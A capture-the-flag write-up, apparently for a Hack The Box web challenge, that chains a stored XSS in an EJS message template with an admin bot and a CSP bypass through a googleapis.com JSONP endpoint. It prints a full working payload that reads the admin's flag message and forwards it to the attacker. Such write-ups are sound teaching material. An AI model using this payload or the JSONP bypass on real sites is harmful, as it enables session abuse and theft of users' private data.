# Massagold
<img width="666" height="322" alt="image" src="https://github.com/user-attachments/assets/c855535c-db91-49db-b95c-b233d288d565" /> 

## Writeup
<img width="1920" height="926" alt="image" src="https://github.com/user-attachments/assets/fcb36bf1-918e-4ae6-a72f-3109157663bd" /> 

The application is a medieval-themed messaging system built with Node.js + Express + EJS + SQLite. Users can register, log in, read their own messages, and send messages to others. The flag is stored in a private message in the `admin` user's inbox, automatically sent at server startup by the `archivist` user.

The goal is to read that message by abusing the admin's session.

---

### Source Code Analysis

#### 1. Stored XSS in `message.ejs`

The EJS template renders the message content using `<%-`:

```ejs
<pre class="letter-copy"><%- message.content %></pre>
```

In EJS, `<%-` outputs the value **without HTML escaping**, unlike `<%=` which sanitizes it. This means any HTML/JavaScript injected into a message's `content` field is rendered raw in the reader's browser - **Stored XSS**.

#### 2. Admin bot in `bot.js`

In `messageController.js`, whenever a message is sent to the `admin` user, the function `enqueueMessageVisit` is called:

```js
if (recipient.username === 'admin') {
  enqueueMessageVisit(result.lastID);
}
```

The bot (`bot.js`) uses **Playwright (headless Firefox)**, logs in as admin using credentials read from a file, and visits the URL `/messages/<id>` of the newly received message:

```js
await loginAsAdmin(page);
await page.goto(targetUrl, { waitUntil: 'load', timeout: VISIT_TIMEOUT_MS });
await page.waitForTimeout(WAIT_AFTER_LOAD_MS); // 2 seconds
```

This means any XSS payload stored in a message's content will be **executed inside the admin's browser**.

#### 3. The flag in `entrypoint.js`

At startup, the seed script creates the very first message in the database:

```js
await createMessage(
  users.archivist,
  users.admin,
  `Archive notice:\n\nThe sealed royal record reads:\n${flag}`
);
```

Since this is the first `INSERT` on an `AUTOINCREMENT` table, the flag is stored in **message with `id = 1`**, readable only by the admin (the `showMessage` query filters by `recipient_id = req.session.user.id`).

#### 4. Content Security Policy in `server.js`

The application sets the following CSP:

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://www.googleapis.com;
  style-src 'self';
  img-src 'self' data:;
  connect-src 'self';
  object-src 'none';
  form-action 'self';
  frame-ancestors 'none'
```

There is no `unsafe-inline` and no nonce, so a plain `<script>alert(1)</script>` gets blocked. However, `script-src` includes `https://www.googleapis.com` - a domain that hosts JSONP endpoints that can be abused as a CSP bypass gadget.

---

### Attack Chain

```
[Attacker] → Sends XSS message to admin
      ↓
[Playwright bot] → Logs in as admin, visits the message
      ↓
[XSS executes] → Script loaded from googleapis.com (CSP bypass)
      ↓
[Fetch /messages/1] → Read using the admin's session
      ↓
[POST /messages] → Flag forwarded back to the attacker
      ↓
[Attacker] → Reads the flag in their own inbox
```

---

### CSP Bypass via JSONP

The endpoint `https://www.googleapis.com/customsearch/v1?callback=CODE` reflects the value of the `callback` parameter at the beginning of its response, wrapping the JSON inside it:

```js
CODE({"error": {...}});
```

Even though Google returns a 400 error ("Invalid JSONP callback name"), it does so **after already writing our code into the output**. The browser interprets the response as JavaScript (the domain is whitelisted), executes `CODE(...)`, and our payload runs before the subsequent `TypeError` caused by `({...})` interrupts execution.

**Critical caveat:** Google converts `<` and `>` characters to `\u003c`/`\u003e` in the response. While `\u003e` is valid inside strings, it is **not valid as the `>` operator in source code**. This means **arrow functions** (`=>`) get broken and cause a silent syntax error. The fix is to use only traditional `function(){}` syntax.

`connect-src 'self'` is also not a problem: the `fetch` calls target `/messages` on the same origin as the app, so they are allowed.

---

### Exploit

The final payload, sent via `fetch` from the DevTools console (to avoid the `contenteditable` form field corrupting the payload by converting URLs into HTML anchor tags):

```js
{
  const code = `fetch('/messages/1').then(function(r){return r.text()}).then(function(t){var s=t.indexOf('HTB{');var e=t.indexOf('}',s);fetch('/messages',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'to_username=YOUR_USERNAME&content='+encodeURIComponent(s+1?t.slice(s,e+1):'nf')})})`;
  const src = 'https://www.googleapis.com/customsearch/v1?callback=' + encodeURIComponent(code);
  const payload = '<script src="' + src + '"><\/script>';

  fetch('/messages', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'to_username=admin&content=' + encodeURIComponent(payload)
  }).then(r => console.log('Sent to admin, status:', r.status));
}
```

<img width="1916" height="166" alt="image" src="https://github.com/user-attachments/assets/c8d143a1-c9b6-4d90-bbad-7b6120bda4d5" /> 

**What the JavaScript code executed as admin does:**
1. `fetch('/messages/1')`: reads the message containing the flag (the admin is the recipient, so the bot's session has access)
2. `t.indexOf('HTB{')` / `t.indexOf('}', s)`: extracts the flag from the page HTML without using regex (which would contain `>` or `\` and get corrupted by the JSONP encoding)
3. `fetch('/messages', { method: 'POST', ... body: 'to_username=YOUR_USERNAME&content=...' })`: forwards the flag as a message to the attacker

After ~15 seconds (bot execution time), the flag appears in the attacker's inbox.

<img width="1920" height="478" alt="image" src="https://github.com/user-attachments/assets/55cdb24f-c80d-4e88-a542-7076cbb6a226" /> 

<img width="1920" height="921" alt="Screenshot From 2026-07-31 11-50-50" src="https://github.com/user-attachments/assets/8af22964-40f2-48bf-b990-096a2def0eb4" /> 

<img width="1920" height="932" alt="image" src="https://github.com/user-attachments/assets/fc2a755d-07df-420a-9b5d-fb72605b4cec" /> 


Flag: **HTB{m3554g3_1n_7h3_cu570dy_ch41n_ac89092b8decfe793333e451ceaa37b2}** 

---

### Vulnerabilities Exploited

| Vulnerability | Location | Details |
|---|---|---|
| Stored XSS | `message.ejs` | Use of `<%-` instead of `<%=` for the `content` field |
| CSP bypass (JSONP) | `server.js` | `googleapis.com` whitelisted in `script-src` |
| Passive privilege escalation | `bot.js` | The bot visits the message authenticated as admin |
| Private data access | `messageController.js` | The bot reads `/messages/1` using the admin's session |

---

### Lessons Learned

- `<%-` in EJS is as dangerous as `innerHTML` in JavaScript: never use it on unsanitized user input.
- A CSP that whitelists external CDN/API domains can be bypassed if those domains host JSONP endpoints — even if the endpoint returns an error, the callback is still echoed into the response.
- Admin bots that visit user-controlled URLs are a classic XSS escalation pattern: the bot's authentication becomes the attacker's weapon.
- Google escapes `<` and `>` as `\u003c`/`\u003e` in JSONP callback parameters — this breaks arrow functions (`=>`), causing a silent syntax error. Always use traditional `function(){}` syntax in JSONP-based payloads.
